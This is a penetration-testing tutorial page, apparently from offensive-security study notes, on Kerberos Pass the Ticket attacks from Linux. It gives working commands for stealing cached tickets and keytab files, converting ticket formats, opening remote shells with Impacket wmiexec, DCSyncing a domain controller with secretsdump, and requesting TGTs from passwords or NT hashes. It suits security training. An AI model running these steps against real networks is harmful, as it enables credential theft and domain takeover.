---
title: "Pass the Ticket (PtT) from Linux"
description: "Using Kerberos tickets from a Linux attack platform with Impacket and keytab files."
tags:
  - password-attacks
  - lateral-movement
  - pass-the-ticket
  - ptt
  - kerberos
  - impacket
  - linux
icon: material/key
---

# 🐧 Pass the Ticket (PtT) from Linux

While Windows tools like Mimikatz and Rubeus are excellent for passing tickets between Windows machines, you will often want to use a stolen Kerberos ticket directly from your Linux attack platform (e.g., Kali Linux).

Linux relies on the `krb5-user` package and Impacket scripts to interact with Active Directory via Kerberos.

---

## 1️⃣ Preparing the Linux Environment

To use Kerberos from Linux, you must configure your machine to resolve the target domain correctly. Kerberos is highly sensitive to time synchronization and DNS resolution.

### Step 1: Sync the Clock
Kerberos tickets will be rejected if your attack machine's clock is more than 5 minutes out of sync with the Domain Controller.
```bash
# Sync time with the DC (e.g., 10.10.10.10)
sudo ntpdate 10.10.10.10
```

### Step 2: Configure DNS
Your Linux machine must be able to resolve the Domain Controller's hostname. Edit `/etc/hosts`:
```text
# /etc/hosts
10.10.10.10    dc01.corp.local corp.local
10.10.10.20    fileserver.corp.local fileserver
```

---

## 2️⃣ Extracting Tickets from Domain-Joined Linux

While rare, you may compromise a Linux server that is joined to the Active Directory domain (e.g., using SSSD or Winbind). These machines also cache Kerberos tickets and use Keytab files, which you can steal to pivot further into the domain.

### Identifying Domain-Joined Linux Machines
Before hunting for tickets, you can quickly check if the Linux system is integrated with Active Directory by looking for signs of Kerberos, Winbind, or SSSD:

```bash
# Check if the realm command is available (used to join domains)
realm list

# Check for SSSD or Winbind configuration files
cat /etc/sssd/sssd.conf
cat /etc/samba/smb.conf | grep "security = ads"

# Look for Kerberos configuration
cat /etc/krb5.conf

# Check if domain users are resolving
getent passwd
```

### Stealing Cached Tickets (ccache)
When a domain user logs into a Linux machine, their Kerberos ticket is typically cached in the `/tmp` directory.
```bash
# Look for cached tickets
ls -la /tmp/krb5cc_*

# If you have read access (e.g., as root), simply copy the file to your attack machine
cp /tmp/krb5cc_1000_xxxxx /tmp/stolen.ccache
```

### Stealing and Using Keytab Files
A **Keytab** file contains pairs of Kerberos principals and encrypted keys (derived from the password). The system uses this file to authenticate to the domain automatically without requiring a password.

The primary system keytab is usually readable only by root:
```bash
ls -la /etc/krb5.keytab
```

If you obtain the keytab, you can use the native `kinit` utility to request a fresh TGT as the machine account (or any other principal in the keytab).
```bash
# List the principals in the keytab
klist -k -t /etc/krb5.keytab

# Request a TGT for the machine account using the keytab
kinit -k -t /etc/krb5.keytab LINUX-SERVER$@CORP.LOCAL

# Verify the ticket is in your local cache
klist
```
Once `kinit` stores the ticket in your local cache, tools like Impacket can use it if you point the `KRB5CCNAME` variable to it.

---

## 3️⃣ Converting Ticket Formats

Windows tools (like Mimikatz) export tickets in `.kirbi` format. Linux tools (like Impacket and the native `krb5` utilities) use the `.ccache` format.

You must convert the ticket before you can use it. Impacket provides `ticketConverter.py` for this exact purpose.

```bash
# Convert a Mimikatz .kirbi to a Linux .ccache
impacket-ticketConverter administrator.kirbi administrator.ccache

# (Optional) Convert back from .ccache to .kirbi
impacket-ticketConverter administrator.ccache administrator.kirbi
```

---

## 4️⃣ Injecting the Ticket on Linux

On Linux, you don't "inject" the ticket into a process memory space like you do on Windows. Instead, you set an environment variable (`KRB5CCNAME`) that points to your `.ccache` file. All subsequent Impacket scripts will automatically look for this variable and use the ticket.

```bash
# Export the environment variable
export KRB5CCNAME=/path/to/administrator.ccache
```

---

## 5️⃣ Executing the Attack (Impacket)

Now that the environment variable is set, you can use any Impacket tool that supports Kerberos authentication (using the `-k` flag).

### Example: Gaining a Shell (wmiexec)
```bash
# Use -k to trigger Kerberos auth.
# -no-pass tells Impacket not to prompt for a password.
# IMPORTANT: You MUST use the FQDN (fileserver.corp.local), NOT the IP address.
impacket-wmiexec -k -no-pass administrator@fileserver.corp.local
```

### Example: Dumping Secrets (secretsdump)
```bash
# Use a stolen TGT for a Domain Admin to DCSync the domain
impacket-secretsdump -k -no-pass administrator@dc01.corp.local -just-dc
```

### Example: Accessing SMB Shares (smbclient.py)
```bash
impacket-smbclient -k -no-pass administrator@fileserver.corp.local
```

---

## 6️⃣ Requesting Tickets with Hashes or Passwords

If you don't have a `.kirbi` file, but you *do* have the plaintext password or NT hash of a user, you can manually request a Kerberos TGT from the Domain Controller using Impacket's `getTGT.py`.

This allows you to switch from NTLM authentication to Kerberos authentication (which is stealthier and sometimes required if NTLM is disabled).

```bash
# Request a TGT using a plaintext password
impacket-getTGT corp.local/administrator:Password123

# Request a TGT using an NT hash
impacket-getTGT -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/administrator

# The ticket is saved as administrator.ccache
export KRB5CCNAME=administrator.ccache
```

---

!!! warning
    **Always remember the FQDN rule.** When executing a Pass the Ticket attack from Linux, the target in your command line (`administrator@hostname.domain.local`) must match the SPN of the target service exactly. If you use an IP address, Impacket will ignore the Kerberos ticket and attempt to fall back to NTLM, causing the attack to fail.
